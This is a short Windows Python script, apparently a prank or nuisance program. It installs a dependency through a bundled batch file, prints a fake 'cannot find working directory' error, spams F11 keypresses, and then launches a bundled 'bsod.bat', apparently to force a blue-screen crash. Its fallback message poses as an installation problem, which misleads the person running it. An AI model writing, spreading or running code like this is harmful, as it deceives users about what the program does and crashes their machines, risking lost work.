"""
All code in this file is licensed under the MIT License, the whole license and copyright holder(s) is in ./LICENSE.

You shall follow all the terms of the MIT License (./LICENSE).
"""

# Using: keyboard == 0.13.5 by Lucas Boppre Niehues (https://github.com/boppreh/keyboard)

import subprocess
import os
from random import randint
from time import sleep
import sys

if sys.platform == "win32":
    os.chdir(os.path.dirname(__file__))

    pip_file_path = str(f"{os.path.dirname(__file__)}/bat/pip.bat")
    subprocess.call([pip_file_path])

    try:
        import keyboard  # pip install keyboard
        range_repeat = randint(1, 3)
        for i in range(range_repeat):
            print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            sleep(0.01)
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")
            keyboard.press_and_release("F11")

        bat_file_path = str(f"{os.path.dirname(__file__)}/bat/bsod.bat")
        subprocess.call([bat_file_path])

    except:
        input("Sorry something went wrong in the installation process. Please turn on internet and try again.")

else:
    input("Sorry, this program is only compatible with Windows.")
